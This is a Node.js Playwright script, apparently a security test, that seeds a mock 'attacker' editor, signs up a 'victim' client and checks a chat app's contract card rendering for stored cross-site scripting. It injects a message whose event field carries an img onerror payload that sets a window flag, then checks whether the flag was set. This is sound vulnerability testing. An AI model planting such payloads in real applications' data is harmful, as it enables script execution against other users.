const { chromium } = require('playwright'); const fs=require('fs');
const mock=fs.readFileSync(process.cwd()+'/mock-supabase.js','utf8');
const url='file://'+process.cwd()+'/index.html';

// Pre-seed a public attacker editor so the victim can open a chat with them.
const seed=`(()=>{function go(){if(!window.__mockdb)return setTimeout(go,5);const db=window.__mockdb;
  db.profiles.push({id:'atk',email:'atk@a',first_name:'Atk',role:'editor',banned:false,created_at:'2026-01-01T00:00:00Z'});
  db.editor_profiles.push({id:'atk',display_name:'Atk',role_label:'editor',city:'X',country:'Y',languages:['English'],specializations:['catOther'],tools:[],credentials:[],bio:'',rate_amount:10,rate_unit:'hour',is_public:true,available:true,created_at:'2026-01-01T00:00:00Z'});
}go();})();`;

(async () => {
  const b=await chromium.launch(); const ctx=await b.newContext({viewport:{width:1400,height:900}});
  await ctx.addInitScript(mock); await ctx.addInitScript(seed);
  const p=await ctx.newPage(); const errs=[]; p.on('pageerror',e=>errs.push(e.message));
  // victim (client) signs up
  await p.goto(url+'#create-account'); await p.waitForTimeout(500);
  await p.fill('#suName','Victim'); await p.fill('#suEmail','victim@test.com'); await p.fill('#suPass','password123');
  await p.click('[data-auth-signup]'); await p.waitForTimeout(900);
  // open chat with attacker editor -> creates a conversation
  await p.goto(url+'#home'); await p.waitForTimeout(900);
  await p.click('.real-card .message-person'); await p.waitForTimeout(800);
  const conv = await p.evaluate(()=>window.__mockdb.conversations[0] && window.__mockdb.conversations[0].id);
  console.log('conversation id:', conv, '| chat windows:', await p.locator('.chat-window').count());
  // attacker injects a kind:contract message with a hostile payload.event (reaches t("c_ev_"+event) unescaped)
  await p.evaluate((conv)=>{
    window.__mockdb.messages.push({ id:'m-atk', conversation_id:conv, sender:'atk', kind:'contract',
      body:'x', created_at:new Date().toISOString(),
      payload:{ contract_id:'cid1', title:'Contract',
        event:'x<img src=z onerror="window.__pwn=Object.assign(window.__pwn||{},{contract:1})">' } });
  }, conv);
  // victim reopens the chat -> messages re-read & rendered via msgHtml->contractCardHtml
  await p.click('.chat-window .close'); await p.waitForTimeout(300);
  await p.click('.real-card .message-person'); await p.waitForTimeout(900);
  const pwned = await p.evaluate(()=>({...window.__pwn}));
  const cc = await p.evaluate(()=>{const el=document.querySelector('.contract-card');return el?el.outerHTML.slice(0,300):'(none)';});
  console.log('window.__pwn =', JSON.stringify(pwned));
  console.log('contract-card =>', cc.replace(/\n/g,' '));
  console.log('pageerrors:', errs.slice(0,3));
  await b.close(); process.exit(0);
})();
